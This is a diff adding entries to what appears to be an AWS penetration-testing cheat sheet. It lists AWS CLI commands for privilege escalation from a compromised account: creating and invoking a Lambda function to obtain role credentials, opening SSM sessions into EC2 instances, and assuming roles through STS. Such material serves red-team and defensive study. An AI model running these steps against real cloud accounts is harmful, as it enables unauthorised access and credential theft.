@@ -121,5 +121,33 @@ def lambda_handler(event, context):
 ```
 - Zip the file in an archive and run the following command
 ```
-aws lambda create-function --function-name privesc-fun --runtime python3.7 --zip-file fileb://my-function.zip --handler lambda_function.lambda_handler --role ROLEARN --region us-east-2 --profile PROFILE
+aws lambda create-function --function-name privesc-fun --runtime python3.7 --zip-file fileb://my-function.zip --handler lambda_function.lambda_handler --role ROLEARN --region REGION --profile PROFILE
+```
+- List lambda functions to confirm the function was created
+```
+aws lambda list-functions
+```
+- Run the function to obtain short-lived credentials
+```
+aws lambda invoke --function-name "privesc-fun" --log-type Tail output.txt --region REGION --profile PROFILE
+```
+
+### Privilege escalation via SSM
+- If the compromised account has `ssm:*` access then it has access to VMs and EC2 instances without needing a public IP address, SSH keys or username/password combinations
+- Start a session in an EC2 instance
+```
+aws ssm start-session --target INSTANCE_ID --profile PROFILE --region REGION
+```
+- Enumerate the EC2 instance's role
+```
+aws sts get-caller-identity
+```
+- Continue enumeration and repeat the enumeration commands at the top of this document
+
+### Privilege escalation via STS
+- If the compromised account has `sts:*` privileges then you can assume roles
+- Enumerate the existing roles and check for the `sts:AssumeRole` action for the role you currently hold
+- Assume the role found and get a short-lived credential set
+```
+aws sts assume-role --role-arn FOUNDROLEARN --role-session-name SOMENAME
 ```
